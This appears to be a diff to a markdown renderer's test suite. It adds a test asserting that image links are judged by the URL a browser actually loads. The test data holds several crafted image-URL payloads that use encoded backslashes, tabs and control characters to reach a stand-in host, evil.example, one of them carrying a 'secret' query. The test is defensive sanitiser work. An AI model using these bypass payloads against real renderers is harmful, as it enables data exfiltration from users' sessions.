@@ -55,6 +55,19 @@ describe('createMarkdownRenderer', () => {
     expect(withHost('![a](https://files.example.evil/a.png)')).not.toContain('src=')
   })
 
+  test('judges an image by the URL the browser loads, not by its text', () => {
+    // Character references reach the attribute decoded; the URL parser reads \ as /, drops tabs
+    // and strips C0 controls, so each of these loads from evil.example in a browser.
+    for (const source of [
+      '![c](&#x5C;&#x5C;evil.example/b.png?q=secret)',
+      '![d](/&#x5C;evil.example/x.png)',
+      '![e](/&Tab;/evil.example/x.png)',
+      '![f](ht&Tab;tps://evil.example/x.png)',
+      '![g](&#1;https://evil.example/x.png)',
+    ]) expect(render(source)).not.toContain('src=')
+    expect(render('![r](files/a.png)')).toContain('src="files/a.png"')
+  })
+
   test('without a DOM or a window it shows the text, never unsanitised HTML', () => {
     expect(createMarkdownRenderer({} as WindowLike)('<b>x</b> **y**')).toBe('<p>&lt;b&gt;x&lt;/b&gt; **y**</p>')
     expect(createMarkdownRenderer(undefined)('**y**')).toBe('<p>**y**</p>')
